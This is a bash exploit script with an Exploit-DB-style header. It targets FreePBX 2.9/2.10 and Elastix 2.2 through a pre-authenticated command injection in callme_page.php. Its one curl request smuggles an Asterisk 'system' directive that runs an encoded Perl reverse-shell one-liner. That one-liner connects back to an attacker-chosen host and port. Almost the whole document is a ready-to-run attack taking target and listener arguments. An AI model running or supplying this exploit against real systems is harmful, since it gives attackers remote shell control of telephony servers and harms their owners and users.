#!/usr/bin/env bash

############################################################
# Exploit Title: FreePBX / Elastix pre-authenticated remote code execution exploit
# Google Dork: oy vey
# Date: March 23rd, 2012
# Author: muts
# Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others.
# Tested on: multiple
# CVE : notyet
# Blog post : http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/ 
# Archive Url : http://www.offensive-security.com/0day/freepbx_callmenum.py.txt
############################################################
# Discovered by Martin Tschirsich
# http://seclists.org/fulldisclosure/2012/Mar/234
# http://www.exploit-db.com/exploits/18649
# Edited: autom4il, now using bash no libraries or what's so ever.
# Edited date: 11/12/22
############################################################

rhost=$1
lhost=$2
lport=$3

extension="1000"

if ! [[ $# -eq 3 ]]
then
    echo "Usage: ${0} <REMOTE-TARGET-IP> <YOUR-MACHINE-IP> <YOUR-LISTENING-PORT>"
else
    echo "[+] Exploiting..."
    curl -s -o /dev/null -k "https://${rhost}/recordings/misc/callme_page.php?action=c&callmenum=${extension}@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22${lhost}%3a${lport}%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A"
fi
